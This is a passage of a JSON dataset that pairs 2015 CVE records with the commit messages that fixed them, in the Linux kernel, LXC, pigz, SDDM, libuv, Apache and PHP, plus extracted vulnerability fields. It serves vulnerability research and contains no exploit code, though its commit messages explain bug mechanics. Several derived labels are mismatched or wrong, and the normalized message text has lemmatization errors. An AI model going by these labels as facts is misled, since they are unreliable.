malformed ecparamters","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a session that uses an Elliptic Curve algorithm","Impact":"cause a denial of service","Root Cause":"does not properly handle ecparameters structures","Attack Type":"remote attacker"},{"commit_id":"4e7c22d447bb6d7e37bfe39ff658486ae78e8d77","cve_id":"CVE-2015-1593","cwe_id":"CWE-264","commit_message":"x86, mm\/ASLR: Fix stack randomization on 64-bit systems\n\nThe issue is that the stack for processes is not properly randomized on\n64 bit architectures due to an integer overflow.\n\nThe affected function is randomize_stack_top() in file\n\"fs\/binfmt_elf.c\":\n\n  static unsigned long randomize_stack_top(unsigned long stack_top)\n  {\n           unsigned int random_variable = 0;\n\n           if ((current->flags & PF_RANDOMIZE) &&\n                   !(current->personality & ADDR_NO_RANDOMIZE)) {\n                   random_variable = get_random_int() & STACK_RND_MASK;\n                   random_variable <<= PAGE_SHIFT;\n           }\n           return PAGE_ALIGN(stack_top) + random_variable;\n           return PAGE_ALIGN(stack_top) - random_variable;\n  }\n\nNote that, it declares the \"random_variable\" variable as \"unsigned int\".\nSince the result of the shifting operation between STACK_RND_MASK (which\nis 0x3fffff on x86_64, 22 bits) and PAGE_SHIFT (which is 12 on x86_64):\n\n\t  random_variable <<= PAGE_SHIFT;\n\nthen the two leftmost bits are dropped when storing the result in the\n\"random_variable\". This variable shall be at least 34 bits long to hold\nthe (22+12) result.\n\nThese two dropped bits have an impact on the entropy of process stack.\nConcretely, the total stack entropy is reduced by four: from 2^28 to\n2^30 (One fourth of expected entropy).\n\nThis patch restores back the entropy by correcting the types involved\nin the operations in the functions randomize_stack_top() and\nstack_maxrandom_size().\n\nThe successful fix can be tested with:\n\n  $ for i in `seq 1 10`; do cat \/proc\/self\/maps | grep stack; done\n  7ffeda566000-7ffeda587000 rw-p 00000000 00:00 0                          [stack]\n  7fff5a332000-7fff5a353000 rw-p 00000000 00:00 0                          [stack]\n  7ffcdb7a1000-7ffcdb7c2000 rw-p 00000000 00:00 0                          [stack]\n  7ffd5e2c4000-7ffd5e2e5000 rw-p 00000000 00:00 0                          [stack]\n  ...\n\nOnce corrected, the leading bytes should be between 7ffc and 7fff,\nrather than always being 7fff.\n\nSigned-off-by: Hector Marco-Gisbert <hecmargi@upv.es>\nSigned-off-by: Ismael Ripoll <iripoll@upv.es>\n[ Rebased, fixed 80 char bugs, cleaned up commit message, added test example and CVE ]\nSigned-off-by: Kees Cook <keescook@chromium.org>\nCc: <stable@vger.kernel.org>\nCc: Linus Torvalds <torvalds@linux-foundation.org>\nCc: Andrew Morton <akpm@linux-foundation.org>\nCc: Al Viro <viro@zeniv.linux.org.uk>\nFixes: CVE-2015-1593\nLink: http:\/\/lkml.kernel.org\/r\/20150214173350.GA18393@www.outflux.net\nSigned-off-by: Borislav Petkov <bp@suse.de>","summary":"The stack randomization feature in the Linux kernel before 3.19.1 on 64-bit platforms uses incorrect data types for the results of bitwise left-shift operations, which makes it easier for attackers to bypass the ASLR protection mechanism by predicting the address of the top of the stack, related to the randomize_stack_top function in fs\/binfmt_elf.c and the stack_maxrandom_size function in arch\/x86\/mm\/mmap.c.","commit_message_1":"fix stack randomization on <number>-bit system the issue is that the stack for process is not properly randomized on <number> bit architecture due to an integer overflow","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by predicting the address of the top of the stack , related to the randomize _ stack _ top function in fs \/ binfmt _ elf . c and the stack _ maxrandom _ size function in arch \/ x86 \/ mm \/ mmap","Impact":"the aslr protection mechanism","Root Cause":"uses incorrect data types for the results of bitwise left - shift operations","Attack Type":"remote attacker"},{"commit_id":"df4d92549f23e1c037e83323aff58a21b3de7fe0","cve_id":"CVE-2015-1465","cwe_id":"CWE-17","commit_message":"ipv4: try to cache dst_entries which would cause a redirect\n\nNot caching dst_entries which cause redirects could be exploited by hosts\non the same subnet, causing a severe DoS attack. This effect aggravated\nsince commit f88649721268999 (\"ipv4: fix dst race in sk_dst_get()\").\n\nLookups causing redirects will be allocated with DST_NOCACHE set which\nwill force dst_release to free them via RCU.  Unfortunately waiting for\nRCU grace period just takes too long, we can end up with >1M dst_entries\nwaiting to be released and the system will run OOM. rcuos threads cannot\ncatch up under high softirq load.\n\nAttaching the flag to emit a redirect later on to the specific skb allows\nus to cache those dst_entries thus reducing the pressure on allocation\nand deallocation.\n\nThis issue was discovered by Marcelo Leitner.\n\nCc: Julian Anastasov <ja@ssi.bg>\nSigned-off-by: Marcelo Leitner <mleitner@redhat.com>\nSigned-off-by: Florian Westphal <fw@strlen.de>\nSigned-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org>\nSigned-off-by: Julian Anastasov <ja@ssi.bg>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The IPv4 implementation in the Linux kernel before 3.18.8 does not properly consider the length of the Read-Copy Update (RCU) grace period for redirecting lookups in the absence of caching, which allows remote attackers to cause a denial of service (memory consumption or system crash) via a flood of packets.","commit_message_1":"try to cache dst_entries which would cause a redirect not caching dst_entries which cause redirects could be exploited by host on the same subnet , causing a severe do attack","Vulnerability Type":"DEPRECATED: Code","Attack Vector":"via a flood of packets .","Impact":"cause a denial of service ( memory consumption or system crash )","Root Cause":"does not properly consider the length of the read - copy update ( rcu ) grace period for redirecting lookups","Attack Type":"remote attacker"},{"commit_id":"600ddd6825543962fb807884169e57b580dba208","cve_id":"CVE-2015-1421","cwe_id":null,"commit_message":"net: sctp: fix slab corruption from use after free on INIT collisions\n\nWhen hitting an INIT collision case during the 4WHS with AUTH enabled, as\nalready described in detail in commit 1be9a950c646 (\"net: sctp: inherit\nauth_capable on INIT collisions\"), it can happen that we occasionally\nstill remotely trigger the following panic on server side which seems to\nhave been uncovered after the fix from commit 1be9a950c646 ...\n\n[  533.876389] BUG: unable to handle kernel paging request at 00000000ffffffff\n[  533.913657] IP: [<ffffffff811ac385>] __kmalloc+0x95\/0x230\n[  533.940559] PGD 5030f2067 PUD 0\n[  533.957104] Oops: 0000 [#1] SMP\n[  533.974283] Modules linked in: sctp mlx4_en [...]\n[  534.939704] Call Trace:\n[  534.951833]  [<ffffffff81294e30>] ? crypto_init_shash_ops+0x60\/0xf0\n[  534.984213]  [<ffffffff81294e30>] crypto_init_shash_ops+0x60\/0xf0\n[  535.015025]  [<ffffffff8128c8ed>] __crypto_alloc_tfm+0x6d\/0x170\n[  535.045661]  [<ffffffff8128d12c>] crypto_alloc_base+0x4c\/0xb0\n[  535.074593]  [<ffffffff8160bd42>] ? _raw_spin_lock_bh+0x12\/0x50\n[  535.105239]  [<ffffffffa0418c11>] sctp_inet_listen+0x161\/0x1e0 [sctp]\n[  535.138606]  [<ffffffff814e43bd>] SyS_listen+0x9d\/0xb0\n[  535.166848]  [<ffffffff816149a9>] system_call_fastpath+0x16\/0x1b\n\n... or depending on the the application, for example this one:\n\n[ 1370.026490] BUG: unable to handle kernel paging request at 00000000ffffffff\n[ 1370.026506] IP: [<ffffffff811ab455>] kmem_cache_alloc+0x75\/0x1d0\n[ 1370.054568] PGD 633c94067 PUD 0\n[ 1370.070446] Oops: 0000 [#1] SMP\n[ 1370.085010] Modules linked in: sctp kvm_amd kvm [...]\n[ 1370.963431] Call Trace:\n[ 1370.974632]  [<ffffffff8120f7cf>] ? SyS_epoll_ctl+0x53f\/0x960\n[ 1371.000863]  [<ffffffff8120f7cf>] SyS_epoll_ctl+0x53f\/0x960\n[ 1371.027154]  [<ffffffff812100d3>] ? anon_inode_getfile+0xd3\/0x170\n[ 1371.054679]  [<ffffffff811e3d67>] ? __alloc_fd+0xa7\/0x130\n[ 1371.080183]  [<ffffffff816149a9>] system_call_fastpath+0x16\/0x1b\n\nWith slab debugging enabled, we can see that the poison has been overwritten:\n\n[  669.826368] BUG kmalloc-128 (Tainted: G        W     ): Poison overwritten\n[  669.826385] INFO: 0xffff880228b32e50-0xffff880228b32e50. First byte 0x6a instead of 0x6b\n[  669.826414] INFO: Allocated in sctp_auth_create_key+0x23\/0x50 [sctp] age=3 cpu=0 pid=18494\n[  669.826424]  __slab_alloc+0x4bf\/0x566\n[  669.826433]  __kmalloc+0x280\/0x310\n[  669.826453]  sctp_auth_create_key+0x23\/0x50 [sctp]\n[  669.826471]  sctp_auth_asoc_create_secret+0xcb\/0x1e0 [sctp]\n[  669.826488]  sctp_auth_asoc_init_active_key+0x68\/0xa0 [sctp]\n[  669.826505]  sctp_do_sm+0x29d\/0x17c0 [sctp] [...]\n[  669.826629] INFO: Freed in kzfree+0x31\/0x40 age=1 cpu=0 pid=18494\n[  669.826635]  __slab_free+0x39\/0x2a8\n[  669.826643]  kfree+0x1d6\/0x230\n[  669.826650]  kzfree+0x31\/0x40\n[  669.826666]  sctp_auth_key_put+0x19\/0x20 [sctp]\n[  669.826681]  sctp_assoc_update+0x1ee\/0x2d0 [sctp]\n[  669.826695]  sctp_do_sm+0x674\/0x17c0 [sctp]\n\nSince this only triggers in some collision-cases with AUTH, the problem at\nheart is that sctp_auth_key_put() on asoc->asoc_shared_key is called twice\nwhen having refcnt 1, once directly in sctp_assoc_update() and yet again\nfrom within sctp_auth_asoc_init_active_key() via sctp_assoc_update() on\nthe already kzfree'd memory, which is also consistent with the observation\nof the poison decrease from 0x6b to 0x6a (note: the overwrite is detected\nat a later point in time when poison is checked on new allocation).\n\nReference counting of auth keys revisited:\n\nShared keys for AUTH chunks are being stored in endpoints and associations\nin endpoint_shared_keys list. On endpoint creation, a null key is being\nadded; on association creation, all endpoint shared keys are being cached\nand thus cloned over to the association. struct sctp_shared_key only holds\na pointer to the actual key bytes, that is, struct sctp_auth_bytes which\nkeeps track of users internally through refcounting. Naturally, on assoc\nor enpoint destruction, sctp_shared_key are being destroyed directly and\nthe reference on sctp_auth_bytes dropped.\n\nUser space can add keys to either list via setsockopt(2) through struct\nsctp_authkey and by passing that to sctp_auth_set_key() which replaces or\nadds a new auth key. There, sctp_auth_create_key() creates a new sctp_auth_bytes\nwith refcount 1 and in case of replacement drops the reference on the old\nsctp_auth_bytes. A key can be set active from user space through setsockopt()\non the id via sctp_auth_set_active_key(), which iterates through either\nendpoint_shared_keys and in case of an assoc, invokes (one of various places)\nsctp_auth_asoc_init_active_key().\n\nsctp_auth_asoc_init_active_key() computes the actual secret from local's\nand peer's random, hmac and shared key parameters and returns a new key\ndirectly as sctp_auth_bytes, that is asoc->asoc_shared_key, plus drops\nthe reference if there was a previous one. The secret, which where we\neventually double drop the ref comes from sctp_auth_asoc_set_secret() with\nintitial refcount of 1, which also stays unchanged eventually in\nsctp_assoc_update(). This key is later being used for crypto layer to\nset the key for the hash in crypto_hash_setkey() from sctp_auth_calculate_hmac().\n\nTo close the loop: asoc->asoc_shared_key is freshly allocated secret\nmaterial and independant of the sctp_shared_key management keeping track\nof only shared keys in endpoints and assocs. Hence, also commit 4184b2a79a76\n(\"net: sctp: fix memory leak in auth key management\") is independant of\nthis bug here since it concerns a different layer (though same structures\nbeing used eventually). asoc->asoc_shared_key is reference dropped correctly\non assoc destruction in sctp_association_free() and when active keys are\nbeing replaced in sctp_auth_asoc_init_active_key(), it always has a refcount\nof 1. Hence, it's freed prematurely in sctp_assoc_update(). Simple fix is\nto remove that sctp_auth_key_put() from there which fixes these panics.\n\nFixes: 730fc3d05cd4 (\"[SCTP]: Implete SCTP-AUTH parameter processing\")\nSigned-off-by: Daniel Borkmann <dborkman@redhat.com>\nAcked-by: Vlad Yasevich <vyasevich@gmail.com>\nAcked-by: Neil Horman <nhorman@tuxdriver.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"Use-after-free vulnerability in the sctp_assoc_update function in net\/sctp\/associola.c in the Linux kernel before 3.18.8 allows remote attackers to cause a denial of service (slab corruption and panic) or possibly have unspecified other impact by triggering an INIT collision that leads to improper handling of shared-key data.","commit_message_1":"sctp : fix slab corruption from use after free on init collision when hitting an init collision case during the 4whs with auth enabled , a already described in detail in commit 1be9a950c646 ( `` net : sctp : inherit auth_capable on init collision '' ) , it can happen that we occasionally still remotely trigger the following panic on server side which seems to have been uncovered after the fix from commit 1be9a950c646","Vulnerability Type":"use - after - free","Attack Vector":"by triggering an init collision that leads to improper handling of shared - key data","Impact":"cause a denial of service ( slab corruption and panic ) or possibly have unspecified other impact","Root Cause":"caused by a use-after-free on INIT collisions","Attack Type":"remote attacker"},{"commit_id":"8ee2a503e102b1a43ec4d83113dc275ab20a869a","cve_id":"CVE-2015-1344","cwe_id":"CWE-264","commit_message":"Implement privilege check when moving tasks\n\nWhen writing pids to a tasks file in lxcfs, lxcfs was checking\nfor privilege over the tasks file but not over the pid being\nmoved.  Since the cgm_movepid request is done as root on the host,\nnot with the requestor's credentials, we must copy the check which\ncgmanager was doing to ensure that the requesting task is allowed\nto change the victim task's cgroup membership.\n\nThis is CVE-2015-1344\nhttps:\/\/bugs.launchpad.net\/ubuntu\/+source\/lxcfs\/+bug\/1512854\n\nSigned-off-by: Serge Hallyn <serge.hallyn@ubuntu.com>","summary":"The do_write_pids function in lxcfs.c in LXCFS before 0.12 does not properly check permissions, which allows local users to gain privileges by writing a pid to the tasks file.","commit_message_1":"implement privilege check when moving task when writing pid to a task file in lxcfs , lxcfs wa checking for privilege over the task file but not over the pid being moved","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by writing a pid to the tasks file","Impact":"gain privileges","Root Cause":"does not properly check permissions","Attack Type":"local attacker"},{"commit_id":"a8b6c3e0537e90fba3c55910fd1b7229d54a60a7","cve_id":"CVE-2015-1342","cwe_id":"CWE-264","commit_message":"Fix checking of parent directories\n\nTaken from the justification in the launchpad bug:\n\nTo a task in freezer cgroup \/a\/b\/c\/d, it should appear that there are no\ncgroups other than its descendents. Since this is a filesystem, we must have\nthe parent directories, but each parent cgroup should only contain the child\nwhich the task can see.\n\nSo, when this task looks at \/a\/b, it should see only directory 'c' and no\nfiles. Attempt to create \/a\/b\/x should result in -EPERM, whether \/a\/b\/x already\nexists or not. Attempts to query \/a\/b\/x should result in -ENOENT whether \/a\/b\/x\nexists or not. Opening \/a\/b\/tasks should result in -ENOENT.\n\nThe caller_may_see_dir checks specifically whether a task may see a cgroup\ndirectory - i.e. \/a\/b\/x if opening \/a\/b\/x\/tasks, and \/a\/b\/c\/d if doing\nopendir('\/a\/b\/c\/d').\n\ncaller_is_in_ancestor() will return true if the caller in \/a\/b\/c\/d looks at\n\/a\/b\/c\/d\/e. If the caller is in a child cgroup of the queried one - i.e. if the\ntask in \/a\/b\/c\/d queries \/a\/b, then *nextcg will container the next (the only)\ndirectory which he can see in the path - 'c'.\n\nBeyond this, regular DAC permissions should apply, with the\nroot-in-user-namespace privilege over its mapped uids being respected. The\nfc_may_access check does this check for both directories and files.\n\nThis is CVE-2015-1342 (LP: #1508481)\n\nSigned-off-by: Serge Hallyn <serge.hallyn@ubuntu.com>","summary":"LXCFS before 0.12 does not properly enforce directory escapes, which might allow local users to gain privileges by (1) querying or (2) updating a cgroup.","commit_message_1":"fix checking of parent directory taken from the justification in the launchpad bug : to a task in freezer cgroup \/a\/b\/c\/d , it should appear that there are no cgroups other than it descendent","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"caused by the failure to properly enforce directory escapes","Impact":"By querying or updating a cgroup","Root Cause":"does not properly enforce directory escapes","Attack Type":"local attacker"},{"commit_id":"592fd47a6245508b79fe6ac819fe6d3b2c1289be","cve_id":"CVE-2015-1335","cwe_id":"CWE-59","commit_message":"CVE-2015-1335: Protect container mounts against symlinks\n\nWhen a container starts up, lxc sets up the container's inital fstree\nby doing a bunch of mounting, guided by the container configuration\nfile.  The container config is owned by the admin or user on the host,\nso we do not try to guard against bad entries.  However, since the\nmount target is in the container, it's possible that the container admin\ncould divert the mount with symbolic links.  This could bypass proper\ncontainer startup (i.e. confinement of a root-owned container by the\nrestrictive apparmor policy, by diverting the required write to\n\/proc\/self\/attr\/current), or bypass the (path-based) apparmor policy\nby diverting, say, \/proc to \/mnt in the container.\n\nTo prevent this,\n\n1. do not allow mounts to paths containing symbolic links\n\n2. do not allow bind mounts from relative paths containing symbolic\nlinks.\n\nDetails:\n\nDefine safe_mount which ensures that the container has not inserted any\nsymbolic links into any mount targets for mounts to be done during\ncontainer setup.\n\nThe host's mount path may contain symbolic links.  As it is under the\ncontrol of the administrator, that's ok.  So safe_mount begins the check\nfor symbolic links after the rootfs->mount, by opening that directory.\n\nIt opens each directory along the path using openat() relative to the\nparent directory using O_NOFOLLOW.  When the target is reached, it\nmounts onto \/proc\/self\/fd\/<targetfd>.\n\nUse safe_mount() in mount_entry(), when mounting container proc,\nand when needed.  In particular, safe_mount() need not be used in\nany case where:\n\n1. the mount is done in the container's namespace\n2. the mount is for the container's rootfs\n3. the mount is relative to a tmpfs or proc\/sysfs which we have\n   just safe_mount()ed ourselves\n\nSince we were using proc\/net as a temporary placeholder for \/proc\/sys\/net\nduring container startup, and proc\/net is a symbolic link, use proc\/tty\ninstead.\n\nUpdate the lxc.container.conf manpage with details about the new\nrestrictions.\n\nFinally, add a testcase to test some symbolic link possibilities.\n\nReported-by: Roman Fiedler\nSigned-off-by: Serge Hallyn <serge.hallyn@ubuntu.com>\nAcked-by: St\u00e9phane Graber <stgraber@ubuntu.com>","summary":"lxc-start in lxc before 1.0.8 and 1.1.x before 1.1.4 allows local container administrators to escape AppArmor confinement via a symlink attack on a (1) mount target or (2) bind mount source.","commit_message_1":"protect container mount against symlinks when a container start up , lxc set up the container 's inital fstree by doing a bunch of mounting , guided by the container configuration file","Vulnerability Type":"Link Following","Attack Vector":"via a symlink attack on a ( 1 ) mount target or ( 2 ) bind mount source .","Impact":"escape apparmor confinement","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"5c3fcae78b63ac9dd56e36075903921bd9461f9e","cve_id":"CVE-2015-1334","cwe_id":"CWE-17","commit_message":"CVE-2015-1334: Don't use the container's \/proc during attach\n\nA user could otherwise over-mount \/proc and prevent the apparmor profile\nor selinux label from being written which combined with a modified\n\/bin\/sh or other commonly used binary would lead to unconfined code\nexecution.\n\nReported-by: Roman Fiedler\nSigned-off-by: St\u00e9phane Graber <stgraber@ubuntu.com>","summary":"attach.c in LXC 1.1.2 and earlier uses the proc filesystem in a container, which allows local container users to escape AppArmor or SELinux confinement by mounting a proc filesystem with a crafted (1) AppArmor profile or (2) SELinux label.","commit_message_1":"do n't use the container 's \/proc during attach a user could otherwise over-mount \/proc and prevent the apparmor profile or selinux label from being written which combined with a modified \/bin\/sh or other commonly used binary would lead to unconfined code execution","Vulnerability Type":"DEPRECATED: Code","Attack Vector":"by mounting a proc filesystem with a crafted ( 1 ) apparmor profile or ( 2 ) selinux label","Impact":"escape apparmor or selinux confinement","Root Cause":"uses the proc filesystem","Attack Type":"local attacker"},{"commit_id":"ca4da5dd1f99fe9c59f1709fb43e818b18ad20e0","cve_id":"CVE-2015-1333","cwe_id":"CWE-119","commit_message":"KEYS: ensure we free the assoc array edit if edit is valid\n\n__key_link_end is not freeing the associated array edit structure\nand this leads to a 512 byte memory leak each time an identical\nexisting key is added with add_key().\n\nThe reason the add_key() system call returns okay is that\nkey_create_or_update() calls __key_link_begin() before checking to see\nwhether it can update a key directly rather than adding\/replacing - which\nit turns out it can.  Thus __key_link() is not called through\n__key_instantiate_and_link() and __key_link_end() must cancel the edit.\n\nCVE-2015-1333\n\nSigned-off-by: Colin Ian King <colin.king@canonical.com>\nSigned-off-by: David Howells <dhowells@redhat.com>\nSigned-off-by: James Morris <james.l.morris@oracle.com>","summary":"Memory leak in the __key_link_end function in security\/keys\/keyring.c in the Linux kernel before 4.1.4 allows local users to cause a denial of service (memory consumption) via many add_key system calls that refer to existing keys.","commit_message_1":"ensure we free the assoc array edit if edit is valid __key_link_end is not freeing the associated array edit structure and this lead to a <number> byte memory leak each time an identical existing key is added with add_key ( )","Vulnerability Type":"buffer overflow","Attack Vector":"via many add _ key system calls that refer to existing keys","Impact":"cause a denial of service ( memory consumption )","Root Cause":"caused by a memory leak","Attack Type":"local attacker"},{"commit_id":"72cf81f6a3404e35028567db2c99a90406e9c6e6","cve_id":"CVE-2015-1331","cwe_id":"CWE-59","commit_message":"CVE-2015-1331: lxclock: use \/run\/lxc\/lock rather than \/run\/lock\/lxc\n\nThis prevents an unprivileged user to use LXC to create arbitrary file\non the filesystem.\n\nSigned-off-by: Serge Hallyn <serge.hallyn@ubuntu.com>\nSigned-off-by: Tyler Hicks <tyhicks@canonical.com>\nAcked-by: St\u00e9phane Graber <stgraber@ubuntu.com>","summary":"lxclock.c in LXC 1.1.2 and earlier allows local users to create arbitrary files via a symlink attack on \/run\/lock\/lxc\/*.","commit_message_1":"lxclock : use \/run\/lxc\/lock rather than \/run\/lock\/lxc this prevents an unprivileged user to use lxc to create arbitrary file on the filesystem","Vulnerability Type":"Link Following","Attack Vector":"via a symlink attack on \/ run \/ lock \/ lxc \/ * .","Impact":"create arbitrary files","Root Cause":"by creating a symbolic link from a temporary file to various files on the system","Attack Type":"local attacker"},{"commit_id":"fdad1406b3ec809f4954ff7cdf9e99eb18c2458f","cve_id":"CVE-2015-1191","cwe_id":"CWE-22","commit_message":"When decompressing with -N or -NT, strip any path from header name.\n\nThis uses the path of the compressed file combined with the name\nfrom the header as the name of the decompressed output file.  Any\npath information in the header name is stripped.  This avoids a\npossible vulnerability where absolute or descending paths are put\nin the gzip header.","summary":"Multiple directory traversal vulnerabilities in pigz 2.3.1 allow remote attackers to write to arbitrary files via a (1) full pathname or (2) .. (dot dot) in an archive.","commit_message_1":"when decompressing with -n or -nt , strip any path from header name","Vulnerability Type":"Path Traversal","Attack Vector":"via a ( 1 ) full pathname or ( 2 ) . . ( dot dot ) in an archive","Impact":"write to arbitrary files","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"4cfed6b0a625593fb43876f04badc4dd99799d86","cve_id":"CVE-2015-0856","cwe_id":"CWE-264","commit_message":"Disable greeters from loading KDE's debug hander\n\nSome themes may use KDE components which will automatically load KDE's\ncrash handler.\n\nIf the greeter were to then somehow crash, that would leave a crash\nhandler allowing other actions, albeit as the locked down SDDM user.\n\nOnly SDDM users using the breeze theme from plasma-workspace are\naffected. Safest and simplest fix is to handle this inside SDDM\ndisabling kcrash via an environment variable for all future themes that\nmay use these libraries.\n\nCVE-2015-0856","summary":"daemon\/Greeter.cpp in sddm before 0.13.0 does not properly disable the KDE crash handler, which allows local users to gain privileges by crashing a greeter when using certain themes, as demonstrated by the plasma-workspace breeze theme.","commit_message_1":"disable greeter from loading kde 's debug hander some theme may use kde component which will automatically load kde's crash handler","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by crashing a greeter when using certain themes , as demonstrated by the plasma - workspace breeze theme .","Impact":"gain privileges","Root Cause":"does not properly disable the kde crash handler","Attack Type":"local attacker"},{"commit_id":"66ab38918c911bcff025562cf06237d7fedaba0c","cve_id":"CVE-2015-0278","cwe_id":"CWE-264","commit_message":"unix: call setgoups before calling setuid\/setgid\n\nPartial fix for #1093","summary":"libuv before 0.10.34 does not properly drop group privileges, which allows context-dependent attackers to gain privileges via unspecified vectors.","commit_message_1":"call setgoups before calling setuid\/setgid partial fix for # <number>","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via unspecified vectors","Impact":"gain privileges","Root Cause":"does not properly drop group privileges","Attack Type":"local attacker"},{"commit_id":"0f2af21aae11972fa924374ddcf52e88347cf5a8","cve_id":"CVE-2015-0275","cwe_id":"CWE-17","commit_message":"ext4: allocate entire range in zero range\n\nCurrently there is a bug in zero range code which causes zero range\ncalls to only allocate block aligned portion of the range, while\nignoring the rest in some cases.\n\nIn some cases, namely if the end of the range is past i_size, we do\nattempt to preallocate the last nonaligned block. However this might\ncause kernel to BUG() in some carefully designed zero range requests\non setups where page size > block size.\n\nFix this problem by first preallocating the entire range, including\nthe nonaligned edges and converting the written extents to unwritten\nin the next step. This approach will also give us the advantage of\nhaving the range to be as linearly contiguous as possible.\n\nSigned-off-by: Lukas Czerner <lczerner@redhat.com>\nSigned-off-by: Theodore Ts'o <tytso@mit.edu>","summary":"The ext4_zero_range function in fs\/ext4\/extents.c in the Linux kernel before 4.1 allows local users to cause a denial of service (BUG) via a crafted fallocate zero-range request.","commit_message_1":"allocate entire range in zero range currently there is a bug in zero range code which cause zero range call to only allocate block aligned portion of the range , while ignoring the rest in some case","Vulnerability Type":"DEPRECATED: Code","Attack Vector":"via a crafted fallocate zero - range request .","Impact":"cause a denial of service","Root Cause":"caused by the improper handling of page size > block size condition when fallocate zero range functionality is used by the EXT4 filesystem","Attack Type":"local attacker"},{"commit_id":"8275cdd0e7ac550dcce2b3ef6d2fb3b808c1ae59","cve_id":"CVE-2015-0274","cwe_id":"CWE-19","commit_message":"xfs: remote attribute overwrite causes transaction overrun\n\nCommit e461fcb (\"xfs: remote attribute lookups require the value\nlength\") passes the remote attribute length in the xfs_da_args\nstructure on lookup so that CRC calculations and validity checking\ncan be performed correctly by related code. This, unfortunately has\nthe side effect of changing the args->valuelen parameter in cases\nwhere it shouldn't.\n\nThat is, when we replace a remote attribute, the incoming\nreplacement stores the value and length in args->value and\nargs->valuelen, but then the lookup which finds the existing remote\nattribute overwrites args->valuelen with the length of the remote\nattribute being replaced. Hence when we go to create the new\nattribute, we create it of the size of the existing remote\nattribute, not the size it is supposed to be. When the new attribute\nis much smaller than the old attribute, this results in a\ntransaction overrun and an ASSERT() failure on a debug kernel:\n\nXFS: Assertion failed: tp->t_blk_res_used <= tp->t_blk_res, file: fs\/xfs\/xfs_trans.c, line: 331\n\nFix this by keeping the remote attribute value length separate to\nthe attribute value length in the xfs_da_args structure. The enables\nus to pass the length of the remote attribute to be removed without\noverwriting the new attribute's length.\n\nAlso, ensure that when we save remote block contexts for a later\nrename we zero the original state variables so that we don't confuse\nthe state of the attribute to be removes with the state of the new\nattribute that we just added. [Spotted by Brain Foster.]\n\nSigned-off-by: Dave Chinner <dchinner@redhat.com>\nReviewed-by: Brian Foster <bfoster@redhat.com>\nSigned-off-by: Dave Chinner <david@fromorbit.com>","summary":"The XFS implementation in the Linux kernel before 3.15 improperly uses an old size value during remote attribute replacement, which allows local users to cause a denial of service (transaction overrun and data corruption) or possibly gain privileges by leveraging XFS filesystem access.","commit_message_1":"remote attribute overwrite cause transaction overrun commit e461fcb ( `` xfs : remote attribute lookup require the value length '' ) pass the remote attribute length in the xfs_da_args structure on lookup so that crc calculation and validity checking can be performed correctly by related code","Vulnerability Type":"Data Processing Errors","Attack Vector":"by leveraging xfs filesystem access","Impact":"cause a denial of service or possibly gain privileges","Root Cause":"caused by the improper handling of remote attributes by the XFS file system","Attack Type":"local attacker"},{"commit_id":"6a974059190b8a0c7e499f4ab12fe108127099cb","cve_id":"CVE-2015-0253","cwe_id":null,"commit_message":"  *) SECURITY: CVE-2015-0253 (cve.mitre.org)\n     core: Fix a crash introduced in with ErrorDocument 400 pointing\n     to a local URL-path with the INCLUDES filter active, introduced\n     in 2.4.11. PR 57531. [Yann Ylavic]\n\n\nSubmitted By: ylavic\nCommitted By: covener\n\n\n\n\n\ngit-svn-id: https:\/\/svn.apache.org\/repos\/asf\/httpd\/httpd\/trunk@1664205 13f79535-47bb-0310-9956-ffa450edef68","summary":"The read_request_line function in server\/protocol.c in the Apache HTTP Server 2.4.12 does not initialize the protocol structure member, which allows remote attackers to cause a denial of service (NULL pointer dereference and process crash) by sending a request that lacks a method to an installation that enables the INCLUDES filter and has an ErrorDocument 400 directive specifying a local URI.","commit_message_1":"<cve_id> ( <file>","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"by sending a request that lacks a method to an installation that enables the includes filter and has an errordocument 400 directive specifying a local uri","Impact":"cause a denial of service ( pointer dereference and process crash )","Root Cause":"does not initialize the protocol structure member","Attack Type":"remote attacker"},{"commit_id":"f3747379accba8e95d70cec0eae0582c8c182050","cve_id":"CVE-2015-0239","cwe_id":"CWE-362","commit_message":"KVM: x86: SYSENTER emulation is broken\n\nSYSENTER emulation is broken in several ways:\n1. It misses the case of 16-bit code segments completely (CVE-2015-0239).\n2. MSR_IA32_SYSENTER_CS is checked in 64-bit mode incorrectly (bits 0 and 1 can\n   still be set without causing #GP).\n3. MSR_IA32_SYSENTER_EIP and MSR_IA32_SYSENTER_ESP are not masked in\n   legacy-mode.\n4. There is some unneeded code.\n\nFix it.\n\nCc: stable@vger.linux.org\nSigned-off-by: Nadav Amit <namit@cs.technion.ac.il>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>","summary":"The em_sysenter function in arch\/x86\/kvm\/emulate.c in the Linux kernel before 3.18.5, when the guest OS lacks SYSENTER MSR initialization, allows guest OS users to gain guest OS privileges or cause a denial of service (guest OS crash) by triggering use of a 16-bit code segment for emulation of a SYSENTER instruction.","commit_message_1":"x86 : sysenter emulation is broken sysenter emulation is broken in several way : <number>","Vulnerability Type":"Race Condition","Attack Vector":"by triggering use of a 16 - bit code segment for emulation of a sysenter instruction .","Impact":"gain guest os privileges or cause a denial of service ( guest os crash )","Root Cause":"caused by an insufficient KVM subsystem's sysenter instruction emulation when invoked from 16-bit code","Attack Type":"local attacker"},{"commit_id":"b585a3aed7880a5fa5c18e2b838fc96f40e075bd","cve_id":"CVE-2015-0231","cwe_id":null,"commit_message":"Fix for bug #68710 (Use After Free Vulnerability in PHP's unserialize())","summary":"Use-after-free vulnerability in the process_nested_data function in ext\/standard\/var_unserializer.re in PHP before 5.4.37, 5.5.x before 5.5.21, and 5.6.x before 5.6.5 allows remote attackers to execute arbitrary code via a crafted unserialize call that leverages improper handling of duplicate numerical keys within the serialized properties of an object.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2014-8142.","commit_message_1":"fix for bug # <number> ( use after free vulnerability in php 's unserialize ( ) )","Vulnerability Type":"use - after - free","Attack 